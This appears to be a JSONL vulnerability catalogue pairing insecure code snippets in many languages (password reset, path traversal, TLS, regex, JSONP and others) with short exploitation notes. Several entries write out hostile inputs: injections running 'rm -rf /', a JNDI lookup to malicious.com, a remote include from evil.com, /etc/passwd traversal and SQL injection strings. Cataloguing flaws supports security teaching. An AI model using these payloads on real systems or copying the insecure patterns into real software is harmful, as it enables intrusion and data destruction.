{"id": "vuln-250", "language": "Node.js", "vulnerability_type": "Insecure Password Reset", "code_snippet": "const resetToken = user.id + Date.now();", "exploitation_techniques": "Guess token using user ID and timestamp.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-252", "language": "Java", "vulnerability_type": "Insecure Password Reset", "code_snippet": "String resetToken = user.getId() + System.currentTimeMillis();", "exploitation_techniques": "Guess token using ID and time.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-253", "language": "PHP", "vulnerability_type": "Insecure Password Reset", "code_snippet": "$reset_token = $user_id . time();", "exploitation_techniques": "Predict token with user ID and timestamp.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-254", "language": "Ruby", "vulnerability_type": "Insecure Password Reset", "code_snippet": "reset_token = \"#{user.id}#{Time.now.to_i}\"", "exploitation_techniques": "Guess token based on ID and time.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-255", "language": "Go", "vulnerability_type": "Insecure Password Reset", "code_snippet": "resetToken := fmt.Sprintf(\"%d%d\", user.ID, time.Now().Unix())", "exploitation_techniques": "Predict token using ID and time.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-256", "language": "C# (.NET)", "vulnerability_type": "Insecure Password Reset", "code_snippet": "var resetToken = user.Id + DateTime.Now.Ticks;", "exploitation_techniques": "Guess token with ID and timestamp.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-257", "language": "Kotlin", "vulnerability_type": "Insecure Password Reset", "code_snippet": "val resetToken = \"${user.id}${System.currentTimeMillis()}\"", "exploitation_techniques": "Predict token using ID and time.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-258", "language": "Scala", "vulnerability_type": "Insecure Password Reset", "code_snippet": "val resetToken = s\"${user.id}${System.currentTimeMillis}\"", "exploitation_techniques": "Guess token with ID and time.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-260", "language": "Elixir", "vulnerability_type": "Insecure Password Reset", "code_snippet": "reset_token = \"#{user.id}#{:os.system_time(:second)}\"", "exploitation_techniques": "Guess token with ID and timestamp.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-261", "language": "Perl", "vulnerability_type": "Insecure Password Reset", "code_snippet": "my $reset_token = $user_id . time();", "exploitation_techniques": "Predict token based on ID and time.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-262", "language": "Node.js", "vulnerability_type": "Improper Error Handling", "code_snippet": "app.get('/', (req, res) => { throw new Error('Test'); });", "exploitation_techniques": "Extract sensitive info from stack traces.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-263", "language": "Python", "vulnerability_type": "Improper Error Handling", "code_snippet": "@app.route('/') def index(): raise Exception('Test')", "exploitation_techniques": "Analyze stack traces for sensitive data.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-264", "language": "Java", "vulnerability_type": "Improper Error Handling", "code_snippet": "@GetMapping(\"/\") public String index() { throw new RuntimeException(\"Test\"); }", "exploitation_techniques": "Extract sensitive info from traces.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-265", "language": "PHP", "vulnerability_type": "Improper Error Handling", "code_snippet": "ini_set('display_errors', 1); throw new Exception('Test');", "exploitation_techniques": "Extract info from error output.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-266", "language": "Ruby", "vulnerability_type": "Improper Error Handling", "code_snippet": "get '/' do raise 'Test' end", "exploitation_techniques": "Analyze stack traces for secrets.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-267", "language": "Go", "vulnerability_type": "Improper Error Handling", "code_snippet": "http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { panic(\"Test\") })", "exploitation_techniques": "Extract sensitive data from panic output.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-268", "language": "C# (.NET)", "vulnerability_type": "Improper Error Handling", "code_snippet": "[HttpGet(\"/\")] public IActionResult Index() { throw new Exception(\"Test\"); }", "exploitation_techniques": "Extract info from stack traces.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-269", "language": "Kotlin", "vulnerability_type": "Improper Error Handling", "code_snippet": "get(\"/\") { throw Exception(\"Test\") }", "exploitation_techniques": "Analyze stack traces for secrets.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-270", "language": "Scala", "vulnerability_type": "Improper Error Handling", "code_snippet": "get(\"/\") { throw new Exception(\"Test\") }", "exploitation_techniques": "Extract sensitive data from traces.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-271", "language": "Rust", "vulnerability_type": "Improper Error Handling", "code_snippet": "router.get(\"/\", |_, _| panic!(\"Test\"));", "exploitation_techniques": "Extract info from panic output.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-272", "language": "Elixir", "vulnerability_type": "Improper Error Handling", "code_snippet": "get \"/\", PageController, :index # raises error", "exploitation_techniques": "Analyze error output for secrets.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-273", "language": "Perl", "vulnerability_type": "Improper Error Handling", "code_snippet": "die \"Test error\";", "exploitation_techniques": "Extract sensitive info from errors.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-274", "language": "Node.js", "vulnerability_type": "Insecure File Download", "code_snippet": "res.download(`files/${req.query.file}`);", "exploitation_techniques": "Download ../../etc/passwd.", "cwe_category": "Access & Authorization"}
{"id": "vuln-275", "language": "Python", "vulnerability_type": "Insecure File Download", "code_snippet": "return send_file(request.args.get('file'))", "exploitation_techniques": "Access ../../etc/passwd.", "cwe_category": "Access & Authorization"}
{"id": "vuln-276", "language": "Java", "vulnerability_type": "Insecure File Download", "code_snippet": "Files.copy(Paths.get(\"files/\" + request.getParameter(\"file\")), response.getOutputStream());", "exploitation_techniques": "Download ../../etc/passwd.", "cwe_category": "Access & Authorization"}
{"id": "vuln-277", "language": "PHP", "vulnerability_type": "Insecure File Download", "code_snippet": "readfile('files/' . $_GET['file']);", "exploitation_techniques": "Access ../../etc/passwd.", "cwe_category": "Access & Authorization"}
{"id": "vuln-278", "language": "Ruby", "vulnerability_type": "Insecure File Download", "code_snippet": "send_file \"files/#{params[:file]}\"", "exploitation_techniques": "Download ../../etc/passwd.", "cwe_category": "Access & Authorization"}
{"id": "vuln-279", "language": "Go", "vulnerability_type": "Insecure File Download", "code_snippet": "http.ServeFile(w, r, \"files/\"+r.URL.Query().Get(\"file\"))", "exploitation_techniques": "Access ../../etc/passwd.", "cwe_category": "Access & Authorization"}
{"id": "vuln-280", "language": "C# (.NET)", "vulnerability_type": "Insecure File Download", "code_snippet": "return PhysicalFile($\"files/{Request.Query[\"file\"]}\", \"application/octet-stream\");", "exploitation_techniques": "Download ../../web.config.", "cwe_category": "Access & Authorization"}
{"id": "vuln-281", "language": "Kotlin", "vulnerability_type": "Insecure File Download", "code_snippet": "call.respondFile(File(\"files/${call.request.queryParameters[\"file\"]}\"))", "exploitation_techniques": "Access ../../etc/passwd.", "cwe_category": "Access & Authorization"}
{"id": "vuln-282", "language": "Scala", "vulnerability_type": "Insecure File Download", "code_snippet": "Ok.sendFile(new File(s\"files/${params(\"file\")}\"))", "exploitation_techniques": "Download ../../etc/passwd.", "cwe_category": "Access & Authorization"}
{"id": "vuln-283", "language": "Rust", "vulnerability_type": "Insecure File Download", "code_snippet": "fs::read_to_string(&req.query(\"file\")?).map(|c| res.render_text(c))", "exploitation_techniques": "Access ../../etc/passwd.", "cwe_category": "Access & Authorization"}
{"id": "vuln-284", "language": "Elixir", "vulnerability_type": "Insecure File Download", "code_snippet": "send_download(conn, {:file, \"files/\" <> params[\"file\"]}", "exploitation_techniques": "Download ../../etc/passwd.", "cwe_category": "Access & Authorization"}
{"id": "vuln-285", "language": "Perl", "vulnerability_type": "Insecure File Download", "code_snippet": "open(my $fh, '<', \"files/$filename\"); $r->sendfile($fh);", "exploitation_techniques": "Access ../../etc/passwd.", "cwe_category": "Access & Authorization"}
{"id": "vuln-286", "language": "Node.js", "vulnerability_type": "Unvalidated Input in GraphQL", "code_snippet": "const resolvers = { Query: { user: (_, { id }) => db.findUser(id) } };", "exploitation_techniques": "Inject malicious IDs or SQL.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-287", "language": "Python", "vulnerability_type": "Unvalidated Input in GraphQL", "code_snippet": "class Query(graphene.ObjectType): user = graphene.Field(User, id=graphene.String()); def resolve_user(self, info, id): return db.get_user(id)", "exploitation_techniques": "Inject malicious input.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-288", "language": "Java", "vulnerability_type": "Unvalidated Input in GraphQL", "code_snippet": "@GraphQLField public User user(@GraphQLArgument(name = \"id\") String id) { return db.findUser(id); }", "exploitation_techniques": "Inject malicious IDs.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-289", "language": "PHP", "vulnerability_type": "Unvalidated Input in GraphQL", "code_snippet": "'user' => function ($root, $args) { return $db->findUser($args['id']); }", "exploitation_techniques": "Inject malicious input.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-290", "language": "Ruby", "vulnerability_type": "Unvalidated Input in GraphQL", "code_snippet": "field :user, Types::UserType, null: true do argument :id, ID end; def user(id:) User.find(id) end", "exploitation_techniques": "Inject malicious IDs.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-291", "language": "Go", "vulnerability_type": "Unvalidated Input in GraphQL", "code_snippet": "func (r *Resolver) User(ctx context.Context, id string) (*model.User, error) { return db.FindUser(id), nil }", "exploitation_techniques": "Inject malicious input.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-292", "language": "C# (.NET)", "vulnerability_type": "Unvalidated Input in GraphQL", "code_snippet": "public User GetUser(string id) => db.FindUser(id);", "exploitation_techniques": "Inject malicious IDs.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-293", "language": "Kotlin", "vulnerability_type": "Unvalidated Input in GraphQL", "code_snippet": "fun user(id: String): User = db.findUser(id)", "exploitation_techniques": "Inject malicious input.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-294", "language": "Scala", "vulnerability_type": "Unvalidated Input in GraphQL", "code_snippet": "Field(\"user\", OptionType(UserType), arguments = ID :: Nil, resolve = ctx => db.findUser(ctx.arg(ID)))", "exploitation_techniques": "Inject malicious IDs.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-295", "language": "Rust", "vulnerability_type": "Unvalidated Input in GraphQL", "code_snippet": "fn user(id: String) -> Option<User> { db.find_user(&id) }", "exploitation_techniques": "Inject malicious input.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-296", "language": "Elixir", "vulnerability_type": "Unvalidated Input in GraphQL", "code_snippet": "field :user, :user do arg :id, non_null(:string); resolve fn %{id: id}, _ -> {:ok, Repo.get(User, id)} end end", "exploitation_techniques": "Inject malicious IDs.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-297", "language": "Perl", "vulnerability_type": "Unvalidated Input in GraphQL", "code_snippet": "sub user { my ($args) = @_; return $db->find_user($args->{id}); }", "exploitation_techniques": "Inject malicious input.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-298", "language": "Node.js", "vulnerability_type": "Insecure Logging", "code_snippet": "console.log(`User login: ${user.email}, ${user.password}`);", "exploitation_techniques": "Access logs to extract credentials.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-299", "language": "Python", "vulnerability_type": "Insecure Logging", "code_snippet": "logging.info(f'User login: {user.email}, {user.password}')", "exploitation_techniques": "Read logs for credentials.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-301", "language": "PHP", "vulnerability_type": "Insecure Logging", "code_snippet": "error_log('User login: ' . $user['email'] . ', ' . $user['password']);", "exploitation_techniques": "Access log files to extract credentials or PII.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-302", "language": "Ruby", "vulnerability_type": "Insecure Logging", "code_snippet": "Rails.logger.info \"User login: #{user.email}, #{user.password}\"", "exploitation_techniques": "Read logs to obtain credentials or session tokens.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-303", "language": "Go", "vulnerability_type": "Insecure Logging", "code_snippet": "log.Printf(\"User login: %s, %s\", user.Email, user.Password)", "exploitation_techniques": "Access logs via exposed endpoints or file leaks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-304", "language": "C# (.NET)", "vulnerability_type": "Insecure Logging", "code_snippet": "logger.LogInformation(\"User login: {Email}, {Password}\", user.Email, user.Password);", "exploitation_techniques": "Extract credentials from log files or monitoring systems.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-306", "language": "Scala", "vulnerability_type": "Insecure Logging", "code_snippet": "logger.info(s\"User login: ${user.email}, ${user.password}\")", "exploitation_techniques": "Extract PII or credentials from logs.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-307", "language": "Rust", "vulnerability_type": "Insecure Logging", "code_snippet": "log::info!(\"User login: {}, {}\", user.email, user.password);", "exploitation_techniques": "Access logs via misconfigured storage.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-308", "language": "Elixir", "vulnerability_type": "Insecure Logging", "code_snippet": "Logger.info(\"User login: #{user.email}, #{user.password}\")", "exploitation_techniques": "Steal credentials from log files.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-309", "language": "Perl", "vulnerability_type": "Insecure Logging", "code_snippet": "print LOG \"User login: $user->{email}, $user->{password}\\n\";", "exploitation_techniques": "Access unprotected log files.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-310", "language": "Node.js", "vulnerability_type": "Prototype Pollution", "code_snippet": "Object.assign({}, req.body);", "exploitation_techniques": "Inject __proto__ to alter object behavior: {\"__proto__\": {\"admin\": true}}", "cwe_category": "Application Logic & Others"}
{"id": "vuln-311", "language": "Python", "vulnerability_type": "Prototype Pollution Equivalent", "code_snippet": "for key, value in user_input.items(): setattr(obj, key, value)", "exploitation_techniques": "Inject __class__ or __init__ to manipulate object behavior.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-312", "language": "Java", "vulnerability_type": "Reflection Injection", "code_snippet": "Method method = Class.forName(className).getMethod(methodName); method.invoke(obj);", "exploitation_techniques": "Invoke dangerous methods like Runtime.exec.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-313", "language": "PHP", "vulnerability_type": "Dynamic Function Call", "code_snippet": "$func = $_GET['action']; $func();", "exploitation_techniques": "Call dangerous functions like eval or system.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-314", "language": "Ruby", "vulnerability_type": "Dynamic Method Invocation", "code_snippet": "obj.send(params[:method])", "exploitation_techniques": "Call sensitive methods like instance_eval.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-315", "language": "Go", "vulnerability_type": "Race Condition", "code_snippet": "if counter > 0 { counter--; doWork() }", "exploitation_techniques": "Exploit TOCTOU to bypass checks.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-316", "language": "C# (.NET)", "vulnerability_type": "Race Condition", "code_snippet": "if (counter > 0) { counter--; DoWork(); }", "exploitation_techniques": "Concurrent threads bypass counter check.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-317", "language": "Kotlin", "vulnerability_type": "Race Condition", "code_snippet": "if (counter > 0) { counter--; doWork() }", "exploitation_techniques": "Race condition to skip counter decrement.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-318", "language": "Scala", "vulnerability_type": "Race Condition", "code_snippet": "if (counter > 0) { counter -= 1; doWork() }", "exploitation_techniques": "Exploit race to bypass counter.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-319", "language": "Rust", "vulnerability_type": "Race Condition", "code_snippet": "if *counter > 0 { *counter -= 1; do_work(); }", "exploitation_techniques": "Concurrent access bypasses counter.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-320", "language": "Elixir", "vulnerability_type": "Message Passing Race", "code_snippet": "def handle_call(:increment, _from, state), do: {:reply, :ok, state + 1}", "exploitation_techniques": "Concurrent calls cause inconsistent state.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-321", "language": "Perl", "vulnerability_type": "Race Condition", "code_snippet": "if (-e $file) { open(my $fh, '>', $file); }", "exploitation_techniques": "TOCTOU attack to overwrite files.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-322", "language": "Node.js", "vulnerability_type": "Server-Side Template Injection", "code_snippet": "const template = Handlebars.compile(userInput); res.send(template(data));", "exploitation_techniques": "Inject {{process.mainModule.require('child_process').execSync('rm -rf /')}}", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-323", "language": "Python", "vulnerability_type": "Code Injection via Dynamic Execution", "code_snippet": "exec(user_input)", "exploitation_techniques": "Inject: __import__('os').system('rm -rf /')", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-324", "language": "Java", "vulnerability_type": "Script Engine Injection", "code_snippet": "ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"js\"); engine.eval(userInput);", "exploitation_techniques": "Inject JavaScript to call Java methods.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-325", "language": "PHP", "vulnerability_type": "Dynamic Include", "code_snippet": "include $_GET['page'] . '.php';", "exploitation_techniques": "Include malicious file: ?page=../../etc/passwd", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-326", "language": "Ruby", "vulnerability_type": "Dynamic Constant Assignment", "code_snippet": "Object.const_set(params[:name], Class.new)", "exploitation_techniques": "Inject malicious class names to alter behavior.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-327", "language": "Go", "vulnerability_type": "SQL Injection via Dynamic Queries", "code_snippet": "db.Query(fmt.Sprintf(\"SELECT * FROM users WHERE name = '%s'\", userInput))", "exploitation_techniques": "Inject: ' OR 1=1--", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-328", "language": "C# (.NET)", "vulnerability_type": "Dynamic Code Execution", "code_snippet": "CSharpCodeProvider provider = new CSharpCodeProvider(); provider.CompileAssemblyFromSource(params, userInput).CreateInstance().Execute();", "exploitation_techniques": "Inject malicious C# code.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-329", "language": "Kotlin", "vulnerability_type": "Script Engine Injection", "code_snippet": "val engine = KotlinJsr223JvmLocalScriptEngineFactory().scriptEngine; engine.eval(userInput)", "exploitation_techniques": "Inject malicious Kotlin code.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-330", "language": "Scala", "vulnerability_type": "Dynamic Code Evaluation", "code_snippet": "scala.tools.nsc.interpreter.IMain().interpret(userInput)", "exploitation_techniques": "Inject malicious Scala code.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-331", "language": "Rust", "vulnerability_type": "Unsafe Memory Access", "code_snippet": "unsafe { let ptr = input as *mut i32; *ptr = 42; }", "exploitation_techniques": "Manipulate pointer to cause memory corruption.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-332", "language": "Elixir", "vulnerability_type": "Dynamic Code Execution", "code_snippet": "Code.eval_string(user_input)", "exploitation_techniques": "Inject: System.cmd(\"rm\", [\"-rf\", \"/\"])", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-333", "language": "Perl", "vulnerability_type": "Dynamic Code Execution", "code_snippet": "eval $user_input;", "exploitation_techniques": "Inject: system('rm -rf /');", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-334", "language": "Node.js", "vulnerability_type": "Regex Injection", "code_snippet": "const regex = new RegExp(req.query.pattern); string.match(regex);", "exploitation_techniques": "Inject complex regex for ReDoS.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-335", "language": "Python", "vulnerability_type": "Regex Injection", "code_snippet": "regex = re.compile(request.args.get('pattern')); regex.match(string)", "exploitation_techniques": "Inject: (a+)+ for ReDoS attack.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-336", "language": "Java", "vulnerability_type": "Regex Injection", "code_snippet": "Pattern pattern = Pattern.compile(request.getParameter(\"pattern\")); pattern.matcher(string);", "exploitation_techniques": "Inject complex regex for DoS.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-337", "language": "PHP", "vulnerability_type": "Regex Injection", "code_snippet": "preg_match('/' . $_GET['pattern'] . '/', $string);", "exploitation_techniques": "Inject: (a+)+ for ReDoS.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-338", "language": "Ruby", "vulnerability_type": "Regex Injection", "code_snippet": "regex = Regexp.new(params[:pattern]); string =~ regex", "exploitation_techniques": "Inject: (a+)+ for ReDoS.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-339", "language": "Go", "vulnerability_type": "Regex Injection", "code_snippet": "regex, _ := regexp.Compile(r.URL.Query().Get(\"pattern\")); regex.MatchString(string)", "exploitation_techniques": "Inject complex regex for DoS.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-340", "language": "C# (.NET)", "vulnerability_type": "Regex Injection", "code_snippet": "Regex regex = new Regex(Request.Query[\"pattern\"]); regex.IsMatch(input);", "exploitation_techniques": "Inject: (a+)+ for ReDoS.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-341", "language": "Kotlin", "vulnerability_type": "Regex Injection", "code_snippet": "val regex = request.queryParameters[\"pattern\"]!!.toRegex(); regex.matches(input)", "exploitation_techniques": "Inject complex regex for DoS.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-342", "language": "Scala", "vulnerability_type": "Regex Injection", "code_snippet": "val regex = params(\"pattern\").r; regex.findFirstIn(input)", "exploitation_techniques": "Inject: (a+)+ for ReDoS.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-343", "language": "Rust", "vulnerability_type": "Regex Injection", "code_snippet": "let regex = Regex::new(&req.query(\"pattern\")?).unwrap(); regex.is_match(&input)", "exploitation_techniques": "Inject complex regex for DoS.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-344", "language": "Elixir", "vulnerability_type": "Regex Injection", "code_snippet": "regex = Regex.compile!(params[:pattern]); Regex.match?(regex, input)", "exploitation_techniques": "Inject: (a+)+ for ReDoS.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-345", "language": "Perl", "vulnerability_type": "Regex Injection", "code_snippet": "if ($input =~ /$pattern/) { ... }", "exploitation_techniques": "Inject: (a+)+ for ReDoS.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-346", "language": "Node.js", "vulnerability_type": "Prototype Pollution in Dependencies", "code_snippet": "const merge = require('lodash.merge'); merge({}, JSON.parse(userInput));", "exploitation_techniques": "Inject __proto__ to alter object behavior.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-347", "language": "Python", "vulnerability_type": "Insecure Pickle Usage", "code_snippet": "import pickle; obj = pickle.loads(request.data)", "exploitation_techniques": "Craft malicious pickle payload for RCE.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-348", "language": "Java", "vulnerability_type": "JNDI Injection", "code_snippet": "InitialContext ctx = new InitialContext(); ctx.lookup(userInput);", "exploitation_techniques": "Inject: ldap://malicious.com/a for RCE.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-349", "language": "PHP", "vulnerability_type": "Remote File Inclusion", "code_snippet": "include($_GET['file']);", "exploitation_techniques": "Inject: http://evil.com/malicious.php", "cwe_category": "Access & Authorization"}
{"id": "vuln-350", "language": "Ruby", "vulnerability_type": "Mass Assignment Vulnerability", "code_snippet": "User.update(params[:user])", "exploitation_techniques": "Inject admin: true in params.", "cwe_category": "Access & Authorization"}
{"id": "vuln-351", "language": "Go", "vulnerability_type": "Insecure HTTP Client", "code_snippet": "client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}};", "exploitation_techniques": "MITM attacks to intercept traffic.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-352", "language": "C# (.NET)", "vulnerability_type": "Insecure TLS Configuration", "code_snippet": "ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) => true;", "exploitation_techniques": "MITM attack to spoof server.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-353", "language": "Kotlin", "vulnerability_type": "Insecure TLS Configuration", "code_snippet": "val client = OkHttpClient.Builder().sslSocketFactory(trustAllCerts(), TrustAllCerts()).build()", "exploitation_techniques": "MITM to intercept requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-354", "language": "Scala", "vulnerability_type": "Insecure TLS Configuration", "code_snippet": "WSClient(wsConfig.copy(ssl = SSLConfig(loose = SSLLooseConfig(disableCertificateVerification = true)))", "exploitation_techniques": "MITM attack to spoof server.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-355", "language": "Rust", "vulnerability_type": "Insecure TLS Configuration", "code_snippet": "let client = Client::builder().danger_accept_invalid_certs(true).build()?;", "exploitation_techniques": "MITM to intercept traffic.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-356", "language": "Elixir", "vulnerability_type": "Insecure TLS Configuration", "code_snippet": ":httpc.request(:get, {url, [ssl: [verify: :verify_none]]}, [], [])", "exploitation_techniques": "MITM attack to spoof server.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-357", "language": "Perl", "vulnerability_type": "Insecure TLS Configuration", "code_snippet": "use LWP::UserAgent; $ua->ssl_opts(verify_hostname => 0);", "exploitation_techniques": "MITM to intercept requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-358", "language": "Node.js", "vulnerability_type": "Insecure WebSocket", "code_snippet": "const ws = new WebSocket('ws://example.com');", "exploitation_techniques": "MITM to intercept WebSocket traffic.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-359", "language": "Python", "vulnerability_type": "Insecure WebSocket", "code_snippet": "websocket.connect('ws://example.com')", "exploitation_techniques": "Sniff unencrypted WebSocket traffic.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-360", "language": "Java", "vulnerability_type": "Insecure WebSocket", "code_snippet": "WebSocketClient client = new WebSocketClient(new URI(\"ws://example.com\"));", "exploitation_techniques": "MITM to capture WebSocket data.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-361", "language": "PHP", "vulnerability_type": "Insecure WebSocket", "code_snippet": "$client = new WebSocket('ws://example.com');", "exploitation_techniques": "Intercept unencrypted traffic.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-362", "language": "Ruby", "vulnerability_type": "Insecure WebSocket", "code_snippet": "Faye::WebSocket::Client.new('ws://example.com')", "exploitation_techniques": "Sniff WebSocket traffic.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-363", "language": "Go", "vulnerability_type": "Insecure WebSocket", "code_snippet": "ws, _ := websocket.Dial(\"ws://example.com\", \"\", \"http://localhost\")", "exploitation_techniques": "MITM to intercept data.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-364", "language": "C# (.NET)", "vulnerability_type": "Insecure WebSocket", "code_snippet": "var ws = new ClientWebSocket(); await ws.ConnectAsync(new Uri(\"ws://example.com\"), CancellationToken.None);", "exploitation_techniques": "Capture unencrypted WebSocket traffic.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-365", "language": "Kotlin", "vulnerability_type": "Insecure WebSocket", "code_snippet": "val ws = WebSocket(\"ws://example.com\")", "exploitation_techniques": "MITM to intercept traffic.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-366", "language": "Scala", "vulnerability_type": "Insecure WebSocket", "code_snippet": "val ws = WebSocket(\"ws://example.com\")", "exploitation_techniques": "Sniff unencrypted WebSocket data.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-367", "language": "Rust", "vulnerability_type": "Insecure WebSocket", "code_snippet": "let ws = tungstenite::connect(Url::parse(\"ws://example.com\")?).1;", "exploitation_techniques": "MITM to capture traffic.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-368", "language": "Elixir", "vulnerability_type": "Insecure WebSocket", "code_snippet": "web_socket = WebSocket.connect(\"ws://example.com\")", "exploitation_techniques": "Intercept unencrypted WebSocket traffic.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-369", "language": "Perl", "vulnerability_type": "Insecure WebSocket", "code_snippet": "my $ws = Net::WebSocket::Client->new('ws://example.com');", "exploitation_techniques": "Sniff WebSocket traffic.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-370", "language": "Node.js", "vulnerability_type": "Insecure JSONP", "code_snippet": "res.jsonp({ data: sensitiveData }, req.query.callback);", "exploitation_techniques": "Inject malicious callback to steal data.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-371", "language": "Python", "vulnerability_type": "Insecure JSONP", "code_snippet": "callback = request.args.get('callback'); return f'{callback}({json.dumps(data)})';", "exploitation_techniques": "Inject malicious callback function.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-372", "language": "Java", "vulnerability_type": "Insecure JSONP", "code_snippet": "String callback = request.getParameter(\"callback\"); response.getWriter().write(callback + \"(\" + data + \")\");", "exploitation_techniques": "Inject malicious callback to steal data.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-373", "language": "PHP", "vulnerability_type": "Insecure JSONP", "code_snippet": "$callback = $_GET['callback']; echo \"$callback($data);\";", "exploitation_techniques": "Inject malicious callback function.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-374", "language": "Ruby", "vulnerability_type": "Insecure JSONP", "code_snippet": "render json: data, callback: params[:callback]", "exploitation_techniques": "Inject malicious callback to steal data.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-375", "language": "Go", "vulnerability_type": "Insecure JSONP", "code_snippet": "callback := r.URL.Query().Get(\"callback\"); fmt.Fprintf(w, \"%s(%s)\", callback, data)", "exploitation_techniques": "Inject malicious callback function.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-376", "language": "C# (.NET)", "vulnerability_type": "Insecure JSONP", "code_snippet": "var callback = Request.Query[\"callback\"]; return Content($\"{callback}({data})\");", "exploitation_techniques": "Inject malicious callback to steal data.", "cwe_category": "Application Logic & Others"}
